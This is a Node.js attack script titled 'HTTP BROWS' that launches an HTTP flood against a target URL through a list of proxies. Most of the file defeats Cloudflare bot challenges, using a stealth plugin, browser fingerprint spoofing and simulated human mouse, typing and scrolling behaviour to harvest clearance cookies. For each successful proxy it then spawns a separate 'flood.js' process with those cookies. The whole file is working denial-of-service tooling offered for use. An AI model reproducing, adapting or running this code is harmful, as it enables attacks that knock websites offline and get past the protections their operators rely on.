const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const {exec} = require('child_process');
const {spawn} = require("child_process");
const chalk = require('chalk');
const errorHandler = error => console.log(error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const validkey = generateRandomString(5, 10);

Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
};

async function simulateHumanMouseMovement(page, element, options = {}) {
    const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }
        await page.mouse.move(nextX, nextY, { steps: 10 });
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < hesitationChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 3));
        }
        currentX = nextX;
        currentY = nextY;
    }
    await page.mouse.move(targetX, targetY, { steps: 5 });
    await new Promise(resolve => setTimeout(resolve, finalDelay));
}

async function simulateHumanTyping(page, element, text, options = {}) {
    const { minDelay = 30, maxDelay = 100, mistakeChance = 0.05, pauseChance = 0.02 } = options;
    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');
    for (let i = 0; i < text.length; i++) {
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await new Promise(resolve => setTimeout(resolve, delay * 2));
            await page.keyboard.press('Backspace');
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        await page.keyboard.press(text[i]);
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 10));
        }
    }
}

async function simulateHumanScrolling(page, distance, options = {}) {
    const { minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1 } = options;
    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;
    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);
        if (i === steps - 1) {
            stepSize = (distance - totalScrolled) * directionMultiplier;
        } else {
            stepSize = stepSize * directionMultiplier;
        }
        await page.evaluate((scrollAmount) => {
            window.scrollBy(0, scrollAmount);
        }, stepSize);
        totalScrolled += stepSize * directionMultiplier;
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 6));
        }
    }
}

async function simulateNaturalPageBehavior(page) {
    const dimensions = await page.evaluate(() => {
        return { width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, scrollHeight: document.documentElement.scrollHeight };
    });
    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 3000));
    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
    }
    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
    }
}

const userAgents = [
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`,
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
  `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
  `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
  ];
  
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m",
  COLOR_PURPLE: "\x1b[35m",
  COLOR_CYAN: "\x1b[36m",
  COLOR_BLUE: "\x1b[34m",
  COLOR_BRIGHT_RED: "\x1b[91m",
  COLOR_BRIGHT_GREEN: "\x1b[92m",
  COLOR_BRIGHT_YELLOW: "\x1b[93m",
  COLOR_BRIGHT_BLUE: "\x1b[94m",
  COLOR_BRIGHT_PURPLE: "\x1b[95m",
  COLOR_BRIGHT_CYAN: "\x1b[96m",
  COLOR_BRIGHT_WHITE: "\x1b[97m",
  BOLD: "\x1b[1m",
  ITALIC: "\x1b[3m"
};

function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
}

async function spoofFingerprint(page) {
    const userAgent = randomElement(userAgents);
    await page.evaluateOnNewDocument((ua) => {
        Object.defineProperty(navigator, 'userAgent', {value: ua});
        Object.defineProperty(navigator, 'platform', {value: 'Win32'});
        Object.defineProperty(navigator, 'vendor', {value: 'Google Inc.'});
        Object.defineProperty(navigator, 'webdriver', {get: () => false});
        Object.defineProperty(navigator, 'hardwareConcurrency', {value: 8});
        Object.defineProperty(navigator, 'deviceMemory', {value: 8});
        Object.defineProperty(navigator, 'language', {value: 'en-US'});
        Object.defineProperty(navigator, 'languages', {value: ['en-US', 'en']});
        Object.defineProperty(navigator, 'plugins', {value: [1, 2, 3, 4, 5]});
        Object.defineProperty(navigator, 'maxTouchPoints', {value: 0});
        
        // Override screen properties
        Object.defineProperty(screen, 'width', {value: 1920});
        Object.defineProperty(screen, 'height', {value: 1080});
        Object.defineProperty(screen, 'availWidth', {value: 1920});
        Object.defineProperty(screen, 'availHeight', {value: 1040});
        Object.defineProperty(screen, 'colorDepth', {value: 24});
        Object.defineProperty(screen, 'pixelDepth', {value: 24});
        
        // WebGL spoofing
        const getParameter = WebGLRenderingContext.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Open Source Technology Center';
            if (parameter === 37446) return 'Mesa DRI Intel(R) HD Graphics 4000 (IVB GT2)';
            return getParameter(parameter);
        };
        
        // Canvas fingerprint spoofing
        const toDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function(type) {
            if (type === 'image/png' || !type) {
                const context = this.getContext('2d');
                context.fillText('Spoofed Canvas', 10, 10);
            }
            return toDataURL.call(this, type);
        };
        
    }, userAgent);
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 8) {
  console.clear();
  console.log(`
  ${chalk.redBright('HTTP BROWS')} | Updated: Oktober 01, 2025
    
  ${chalk.blueBright('Usage:')}
    ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads browser> <threads flood> <rates> <proxy>`)}
  `);
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];
const urlObj = new URL(targetURL);
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

if (!/^https?:\/\//i.test(targetURL)) {
    console.error('URL must start with http:// or https://');
    process.exit(1);
};

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(proxy => {
            const regex = /^[\w\.-]+:\d+$/;
            return regex.test(proxy);
        });
        return proxies;
    } catch (error) {
        console.error('Error file proxy:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);

// Fungsi utama untuk mendeteksi dan menyelesaikan Cloudflare Challenge
async function handleCloudflareChallenge(page, browserProxy) {
    try {
        await page.waitForTimeout(2000);
        
        const title = await page.title();
        const content = await page.content();
        const url = page.url();

        // Deteksi semua jenis Cloudflare Challenge
        const isCloudflareChallenge = 
            title.includes("Just a moment") ||
            title.includes("Verifying") ||
            title.includes("Checking your browser") ||
            content.includes("challenge-platform") ||
            content.includes("cloudflare") ||
            content.includes("cf-challenge") ||
            content.includes("cf-browser-verification") ||
            url.includes("challenges.cloudflare.com") ||
            content.includes("ray-id") ||
            content.includes("cf-ray");

        if (!isCloudflareChallenge) {
            return false;
        }

        colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Challenge detected: ${title}`);
        colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Proxy: ${browserProxy} - Solving challenge...`);

        // Tunggu initial delay 15-20 detik seperti yang disebutkan
        const waitTime = 15000 + Math.random() * 5000;
        colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Waiting ${Math.round(waitTime/1000)}s for challenge preparation...`);
        await page.waitForTimeout(waitTime);

        // Coba berbagai selector untuk challenge Cloudflare
        const challengeSelectors = [
            // Turnstile Challenge
            'input[type="checkbox"][name="cf-turnstile-response"]',
            '.cf-turnstile',
            '.cf-challenge',
            '.challenge-form',
            
            // Legacy Challenges
            '#challenge-form input[type="checkbox"]',
            '.hcaptcha-box',
            '.cf-browser-verification',
            
            // Button Challenges
            'input[type="button"][value*="Verify"]',
            'button[type*="submit"]',
            '.verify-btn',
            '.success-button',
            
            // Generic selectors
            'input[type="submit"]',
            'button:contains("Verify")',
            'button:contains("Continue")',
            'button:contains("Submit")',
            
            // Div clickable areas
            'div[role="button"]',
            '.mark',
            '.checkbox',
            '.cf-btn'
        ];

        let challengeSolved = false;

        for (const selector of challengeSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    colored(colors.COLOR_BRIGHT_CYAN, `[CLOUDFLARE] Found challenge element: ${selector}`);
                    
                    // Simulasi mouse movement yang natural
                    await simulateHumanMouseMovement(page, element, {
                        minMoves: 8,
                        maxMoves: 15,
                        minDelay: 30,
                        maxDelay: 120,
                        finalDelay: 800,
                        jitterFactor: 0.15,
                        overshootChance: 0.3,
                        hesitationChance: 0.2
                    });

                    // Click the element
                    await element.click();
                    colored(colors.COLOR_BRIGHT_GREEN, `[CLOUDFLARE] Clicked challenge element: ${selector}`);
                    
                    challengeSolved = true;
                    break;
                }
            } catch (error) {
                // Continue to next selector
            }
        }

        if (!challengeSolved) {
            // Fallback: coba click di area umum challenge
            colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] No specific element found, trying general area click...`);
            
            // Cari container challenge
            const challengeContainers = [
                '.main-wrapper',
                '.challenge-container',
                '#cf-content',
                '.wrapper',
                '.content'
            ];

            for (const containerSelector of challengeContainers) {
                try {
                    const container = await page.$(containerSelector);
                    if (container) {
                        const box = await container.boundingBox();
                        if (box) {
                            // Click di tengah container
                            await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
                            colored(colors.COLOR_BRIGHT_GREEN, `[CLOUDFLARE] Clicked container: ${containerSelector}`);
                            challengeSolved = true;
                            break;
                        }
                    }
                } catch (error) {
                    // Continue to next container
                }
            }
        }

        // Tunggu navigasi atau perubahan halaman
        if (challengeSolved) {
            colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Waiting for challenge result...`);
            await page.waitForTimeout(5000);
            
            try {
                await page.waitForNavigation({ 
                    waitUntil: ['domcontentloaded', 'networkidle0', 'networkidle2'], 
                    timeout: 30000 
                });
                colored(colors.COLOR_BRIGHT_GREEN, `[CLOUDFLARE] Navigation detected - challenge likely solved`);
            } catch (navError) {
                colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] No navigation, checking page change...`);
            }

            // Verifikasi apakah challenge berhasil diselesaikan
            const newTitle = await page.title();
            const newContent = await page.content();
            
            const stillChallenged = 
                newTitle.includes("Just a moment") ||
                newTitle.includes("Verifying") ||
                newContent.includes("challenge-platform");

            if (!stillChallenged) {
                colored(colors.COLOR_BRIGHT_GREEN, `[CLOUDFLARE] Challenge successfully solved!`);
                return true;
            } else {
                colored(colors.COLOR_BRIGHT_YELLOW, `[CLOUDFLARE] Still challenged, retrying...`);
                return false;
            }
        }

        return challengeSolved;

    } catch (error) {
        colored(colors.COLOR_BRIGHT_RED, `[CLOUDFLARE] Error handling challenge: ${error.message}`);
        return false;
    }
}

async function solvingCaptcha(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            colored(colors.COLOR_RED, "[BLOCKED] Blocked by Cloudflare. Exiting.");
            return;
        }

        // Handle Cloudflare Challenge
        const challengeResult = await handleCloudflareChallenge(page, browserProxy);
        
        if (challengeResult) {
            colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Cloudflare challenge solved with proxy: ${browserProxy}`);
        } else {
            colored(colors.COLOR_BRIGHT_YELLOW, `[RETRY] Cloudflare challenge not solved, will retry...`);
        }

        await sleep(2);
    } catch (error) {
        colored(colors.COLOR_BRIGHT_RED, `[ERROR] Error in solvingCaptcha: ${error.message}`);
        throw error;
    }
}

async function RetrySolving(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            colored(colors.COLOR_RED, "[BLOCKED] Blocked by Cloudflare. Exiting.");
            return;
        }

        // Tunggu lebih lama untuk retry (17-25 detik)
        const waitTime = 17000 + Math.random() * 8000;
        colored(colors.COLOR_BRIGHT_YELLOW, `[RETRY] Waiting ${Math.round(waitTime/1000)}s before retry...`);
        await page.waitForTimeout(waitTime);

        // Handle Cloudflare Challenge dengan approach berbeda
        const challengeResult = await handleCloudflareChallenge(page, browserProxy);
        
        if (challengeResult) {
            colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Cloudflare challenge solved on retry with proxy: ${browserProxy}`);
        }

        await sleep(2);
    } catch (error) {
        colored(colors.COLOR_BRIGHT_RED, `[ERROR] Error in RetrySolving: ${error.message}`);
        throw error;
    }
}

async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 3) {
    let browser;
    const userAgent = randomElement(userAgents);
    
    const options = {
        headless: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            '--window-size=1920,1080',
            '--disable-gpu',
            '--disable-accelerated-2d-canvas',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-back-forward-cache',
            '--disable-browser-side-navigation',
            '--disable-renderer-backgrounding',
            '--disable-ipc-flooding-protection',
            '--metrics-recording-only',
            '--disable-extensions',
            '--disable-default-apps',
            '--disable-application-cache',
            '--disable-component-extensions-with-background-pages',
            '--disable-client-side-phishing-detection',
            '--disable-popup-blocking',
            '--disable-prompt-on-repost',
            '--disable-infobars',
            '--disable-breakpad',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--disable-search-engine-choice-screen',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--ssl-version-min=tls1.2',
            '--ssl-version-max=tls1.3',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--test-type',
            '--allow-pre-commit-input',
            '--force-color-profile=srgb',
            '--use-mock-keychain',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        }
    };

    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        
        await spoofFingerprint(page);

        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(90 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 90000 });
        await simulateNaturalPageBehavior(page);

        let captchaAttempts = 0;
        const maxCaptchaAttempts = 4;

        while (captchaAttempts < maxCaptchaAttempts) {
            await RetrySolving(browser, page, browserProxy);
            const cookies = await page.cookies(targetURL);
            const shortCookies = cookies.filter(cookie => cookie.value.length < 15);

            if (shortCookies.length === 0) {
                const title = await page.title();
                const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
                await browser.close();
                
                colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Got valid cookies! Title: ${title}`);
                return {
                    title: title,
                    browserProxy: browserProxy,
                    cookies: cookieString,
                    userAgent: userAgent
                };
            }
            
            shortCookies.forEach(cookie => {
                colored(colors.COLOR_BRIGHT_YELLOW, `[WARNING] Short cookie "${cookie.name}" detected`);
            });
            
            captchaAttempts++;
            colored(colors.COLOR_BRIGHT_YELLOW, `[RETRY] Attempt ${captchaAttempts}/${maxCaptchaAttempts} with proxy: ${browserProxy}`);
        }
        
        colored(colors.COLOR_BRIGHT_RED,`[FAILED] Failed to solve captcha with proxy: ${browserProxy}`);
        await browser.close();
        return null;
        
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
        colored(colors.COLOR_BRIGHT_RED, `[ERROR] Browser error with proxy ${browserProxy}: ${error.message}`);
        throw error;
    }
}

let cookieCount = 0;
async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries >= 2) {
        const currentTask = queue.length();
        colored(colors.COLOR_BRIGHT_RED, `[FAILED] Max retries reached for proxy: ${browserProxy}`);
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            if (response.title === "Attention Required! | Cloudflare") {
                colored(colors.COLOR_RED, "[BLOCKED] Blocked by Cloudflare. Exiting.");
                return;
            }
            if (!response.cookies) {
                colored(colors.COLOR_BRIGHT_YELLOW, `[WARNING] No cookies with proxy: ${browserProxy}`);
                await startthread(targetURL, browserProxy, task, done, retries + 1);
                return;
            } 
            
            cookieCount++;
            colored(colors.COLOR_BRIGHT_GREEN, `[SUCCESS] Total solved: ${cookieCount} | Title: ${response.title} | Proxy: ${browserProxy}`);
            
            try {
                spawn("node", [
                    "flood.js",
                    targetURL,
                    duration, 
                    thread,
                    response.browserProxy,
                    rates,
                    response.cookies,
                    response.userAgent
                ]);
                colored(colors.COLOR_BRIGHT_CYAN, `[LAUNCH] Started flood.js with cookies from proxy: ${browserProxy}`);
            } catch (error) {
                colored(colors.COLOR_BRIGHT_RED, "[ERROR] Error spawning flood.js: " + error.message);
            }
            
            done(null, { task });
        } else {
            await startthread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        colored(colors.COLOR_BRIGHT_YELLOW, `[RETRY] Error with proxy ${browserProxy}, retrying...`);
        await startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}

const queue = async.queue(function(task, done) {
    startthread(targetURL, task.browserProxy, task, done)
}, threads);

queue.drain(function() {
    colored(colors.COLOR_BRIGHT_GREEN, "[COMPLETE] All proxies processed successfully");
    process.exit(0);
});

queue.error(function(err, task) {
    colored(colors.COLOR_BRIGHT_RED, `[QUEUE ERROR] Task failed: ${err.message}`);
});

async function main() {
    if (proxies.length === 0) {
        colored(colors.COLOR_BRIGHT_RED, "[ERROR] No valid proxies found in file. Exiting.");
        process.exit(1);
    }
    
    colored(colors.COLOR_BRIGHT_CYAN, `[START] Starting with ${proxies.length} proxies...`);
    
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({browserProxy: browserProxy});
    }
    
    setTimeout(() => {
        colored(colors.COLOR_BRIGHT_YELLOW, "[TIMEOUT] Time's up! Cleaning up...");
        queue.kill();
        exec('pkill -f node.*flood', (err) => {
            if (err && err.code !== 1) {
                colored(colors.COLOR_BRIGHT_YELLOW, "[CLEANUP] No flood.js processes found");
            } else {
                colored(colors.COLOR_BRIGHT_GREEN, "[CLEANUP] Successfully killed flood.js processes");
            }
        });
        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                colored(colors.COLOR_BRIGHT_YELLOW, "[CLEANUP] No Chrome processes found");
            } else {
                colored(colors.COLOR_BRIGHT_GREEN, "[CLEANUP] Successfully killed Chrome processes");
            }
        });
        setTimeout(() => {
            colored(colors.COLOR_BRIGHT_GREEN, "[EXIT] Cleanup complete, exiting...");
            process.exit(0);
        }, 5000);
    }, duration * 1000);
}

console.clear();
colored(colors.COLOR_BRIGHT_CYAN, "===============================================");
colored(colors.COLOR_BRIGHT_GREEN, "[INFO] HTTP BROWS - Cloudflare Challenge Solver");
colored(colors.COLOR_BRIGHT_CYAN, "===============================================");
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Target: ${targetURL}`);
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Duration: ${duration} seconds`);
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Threads Browser: ${threads}`);
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Threads Flooder: ${thread}`);
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Rates Flooder: ${rates}`);
colored(colors.COLOR_BRIGHT_GREEN, `[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`);
colored(colors.COLOR_BRIGHT_CYAN, "===============================================");

main().catch(err => {
    colored(colors.COLOR_BRIGHT_RED, "[FATAL ERROR] Main function error: " + err.message);
    process.exit(1);
});
